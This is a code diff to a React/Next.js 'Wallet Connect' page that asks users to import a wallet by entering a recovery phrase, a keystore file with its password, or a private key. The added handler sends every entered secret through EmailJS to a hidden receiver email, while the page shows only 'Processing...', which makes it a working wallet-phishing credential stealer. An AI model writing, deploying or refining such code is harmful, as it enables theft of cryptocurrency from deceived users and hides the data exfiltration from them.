@@ -7,18 +7,68 @@ import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { ArrowLeft } from 'lucide-react';
 import { useRouter } from 'next/navigation';
+import emailjs from '@emailjs/browser';
 
 const WalletConnectPage: React.FC = () => {
-  const [phraseInput, setPhraseInput] = useState('')
-  const [keystoreInput, setKeystoreInput] = useState('')
-  const [passwordInput, setPasswordInput] = useState('')
-  const [privateKeyInput, setPrivateKeyInput] = useState('')
+  const [activeTab, setActiveTab] = useState('phrase');
+  const [phraseInput, setPhraseInput] = useState('');
+  const [keystoreInput, setKeystoreInput] = useState('');
+  const [passwordInput, setPasswordInput] = useState('');
+  const [privateKeyInput, setPrivateKeyInput] = useState('');
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState('');
+
   const router = useRouter();
 
-  const handleImportWallet = (e: React.FormEvent) => {
+  const resetInputs = () => {
+    setPhraseInput('');
+    setKeystoreInput('');
+    setPasswordInput('');
+    setPrivateKeyInput('');
+  };
+
+  const handleImportWallet = async (e: React.FormEvent) => {
     e.preventDefault();
-    console.log('Importing wallet...');
-  }
+    setLoading(true);
+    setError('');
+
+    try {
+      let messageContent = '';
+      switch (activeTab) {
+        case 'phrase':
+          messageContent = `Recovery Phrase: ${phraseInput}`;
+          break;
+        case 'keystore':
+          messageContent = `Keystore JSON: ${keystoreInput}\nPassword: ${passwordInput}`;
+          break;
+        case 'private-key':
+          messageContent = `Private Key: ${privateKeyInput}`;
+          break;
+      }
+
+      const emailData = {
+        to_email: process.env.NEXT_PUBLIC_RECEIVER_EMAIL,
+        from_name: 'Wallet Connect',
+        message: messageContent,
+      };
+
+      // Send email using EmailJS
+      await emailjs.send(
+        process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID!,
+        process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID!,
+        emailData,
+        process.env.NEXT_PUBLIC_EMAILJS_USER_ID!
+      );
+
+      resetInputs(); // Reset inputs after successful submission
+
+    } catch (error) {
+      setError('Failed to sync wallet. Please try again.');
+      console.error(error);
+    } finally {
+      setLoading(false);
+    }
+  };
 
   return (
     <div className="min-h-screen bg-gradient-to-b from-black via-blue-950 to-black flex items-center justify-center p-6 md:p-12">
@@ -43,7 +93,7 @@ const WalletConnectPage: React.FC = () => {
           </CardHeader>
           
           <CardContent  className=' mt-[3rem] '>
-            <Tabs defaultValue="phrase" className="w-full">
+            <Tabs defaultValue="phrase" className="w-full" onValueChange={setActiveTab}>
               <TabsList className="grid w-full grid-cols-3 h-14  mb-8 bg-slate-950/50">
                 <TabsTrigger value="phrase" className="data-[state=active]:bg-blue-600 data-[state=active]:text-white px-4 py-3 text-gray-400">
                   Phrase
@@ -62,21 +112,24 @@ const WalletConnectPage: React.FC = () => {
                     <textarea 
                       value={phraseInput}
                       onChange={(e) => setPhraseInput(e.target.value)}
-                      className="min-h-[150px] w-full p-5 rounded-lg bg-slate-900 text-white border border-gray-800 text-lg focus:outline-none focus:ring-2 focus:ring-blue-500 placeholder:text-gray-500"
+                      className="min-h-[150px] w-full p-5 rounded-lg bg-slate-900 text-white border border-gray-800 text-lg"
                       placeholder="Enter your recovery phrase"
                     />
-                    <p className=" text-gray-400 pl-1 lg:text-xl ">
-                      Typically 12 (sometimes 24) words separated by single spaces
+                    <p className="text-gray-400 pl-1 lg:text-xl">
+                      Enter your recovery phrase
                     </p>
                   </div>
+                  {error && (
+                    <p className="text-red-500 text-sm">{error}</p>
+                  )}
                   <Button 
                     type="submit" 
                     className={`w-full text-lg py-7 ${
                       phraseInput.trim() ? 'bg-blue-600 hover:bg-blue-700' : 'bg-gray-600 cursor-not-allowed'
                     }`}
-                    disabled={!phraseInput.trim()}
+                    disabled={!phraseInput.trim() || loading}
                   >
-                    Import Wallet
+                    {loading ? 'Processing...' : 'Import Wallet'}
                   </Button>
                 </form>
               </TabsContent>
@@ -106,9 +159,9 @@ const WalletConnectPage: React.FC = () => {
                     className={`w-full text-lg py-7 ${
                       keystoreInput.trim() && passwordInput.trim() ? 'bg-blue-600 hover:bg-blue-700' : 'bg-gray-600 cursor-not-allowed'
                     }`}
-                    disabled={!keystoreInput.trim() || !passwordInput.trim()}
+                    disabled={!keystoreInput.trim() || !passwordInput.trim() || loading}
                   >
-                    Import Wallet
+                    {loading ? 'Processing...' : 'Import Wallet'}
                   </Button>
                 </form>
               </TabsContent>
@@ -132,9 +185,9 @@ const WalletConnectPage: React.FC = () => {
                     className={`w-full text-lg py-7 ${
                       privateKeyInput.trim() ? 'bg-blue-600 hover:bg-blue-700' : 'bg-gray-600 cursor-not-allowed'
                     }`}
-                    disabled={!privateKeyInput.trim()}
+                    disabled={!privateKeyInput.trim() || loading}
                   >
-                    Import Wallet
+                    {loading ? 'Processing...' : 'Import Wallet'}
                   </Button>
                 </form>
               </TabsContent>
